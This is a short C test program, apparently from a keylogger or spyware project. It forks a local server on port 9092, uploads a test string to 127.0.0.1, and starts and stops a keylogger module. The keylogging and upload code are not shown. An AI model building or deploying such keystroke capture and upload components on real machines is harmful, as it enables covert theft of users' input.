#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <dlfcn.h>
#include <string.h>

#include "../include/core.h"
#include "../include/plugin_utils.h"
#include "../include/network_utils.h"

#define PORT 9092

int main()
{
	pid_t pid = fork();

	if (pid < 0)
	{
		DEBUG_PRINT((P_ERROR "Fork failed\n"));
		return ERROR;
	}
	else if (pid == 0)
	{
		start_server(PORT);
	}
	else
	{
		sleep(2);
		upload_data("127.0.0.1", PORT, "testing", strlen("testing"));


		keylogger_init();

		sleep(2);

		keylogger_end();
	}

	return OK;
}
